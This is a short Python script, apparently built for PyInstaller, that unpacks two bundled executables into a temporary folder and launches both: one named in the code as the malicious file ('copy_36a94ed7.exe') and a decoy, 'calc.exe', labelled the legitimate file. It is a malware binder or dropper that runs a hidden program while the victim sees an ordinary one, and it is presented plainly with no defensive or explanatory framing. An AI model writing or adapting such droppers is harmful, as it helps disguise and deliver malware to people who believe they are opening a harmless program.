import os
import subprocess
import sys
import tempfile
import shutil

def main():
    mal_filename = "copy_36a94ed7.exe"
    legit_filename = "calc.exe"

    exe_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    temp_dir = tempfile.mkdtemp()
    mal_path = os.path.join(temp_dir, mal_filename)
    legit_path = os.path.join(temp_dir, legit_filename)

    try:
        shutil.copy2(os.path.join(exe_dir, mal_filename), mal_path)
        shutil.copy2(os.path.join(exe_dir, legit_filename), legit_path)

        subprocess.Popen([mal_path])
        subprocess.Popen([legit_path])

    except Exception as e:
        import traceback
        traceback.print_exc()
        input(f"Error al ejecutar: {e}")

if __name__ == "__main__":
    main()